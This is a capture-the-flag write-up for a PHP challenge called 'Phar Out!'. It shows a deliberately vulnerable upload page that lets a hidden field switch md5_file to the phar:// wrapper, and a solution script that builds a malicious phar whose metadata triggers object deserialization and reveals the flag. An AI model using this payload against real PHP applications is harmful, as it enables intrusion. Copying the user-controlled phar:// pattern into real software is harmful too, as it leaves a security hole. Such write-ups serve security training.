# Phar Out!

## Question

index.php
```php
<?php

include("wrapper.php");

?>

<html>
<head>
	<title>Phar Out!</title>
</head>

<body>

<p>
Upload a file, and I'll hash it with MD5 :-)
</p>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" enctype="multipart/form-data">
<input type="file" name="the_file" />
<input type="hidden" name="s" value="f" />
<input type="submit" name="submit" value="Upload File" />
</form>

<?php

if (isset($_POST['submit']) && $_FILES['the_file']['size'] > 0)
{
	$dest_dir = getcwd() . "/uploads/";

	echo "<br />Submitted<br />";
	$target_file = $dest_dir . basename($_FILES["the_file"]["name"]);
	//print_r($_FILES);
	move_uploaded_file($_FILES["the_file"]["tmp_name"], $target_file);

	if ($_POST['s'] === 'p')
		$s = 'phar://';
	else
		$s = 'file://';
	echo md5_file("$s$target_file");
	unlink($target_file);
}

?>

</body>

</html>

```

wrapper.php
```php
<?php

include("doit.php");

class Wrapper
{
	private $doit;
	public function __wakeup()
	{
		if (isset($this->doit))
		{
			$this->doit = new Doit();
		}
		else
		{
			echo "Hello from Wrapper!";
		}
	}
}

?>

```

doit.php
```php
<?php

class Doit {
        public function __construct()
        {
                $flag = getenv("FLAG");
                echo "flag{{$flag}}\n";
        }
}

?>

```


## Solution
Simple PHP phar deserialization problem. Just craft the wrapper class and set the doit to our dummy variable
```php
<?php
	$phar = new Phar('test.phar');
	$phar->startBuffering();
	$phar->addFromString('test.txt', 'text');
	$phar->setStub('<?php __HALT_COMPILER(); ? >');

	class Doit {
	}

	class Wrapper {
		public $doit;
	}

	$object = new Wrapper;
	$object->doit = new Doit;
	$phar->setMetadata($object);
	$phar->stopBuffering();
```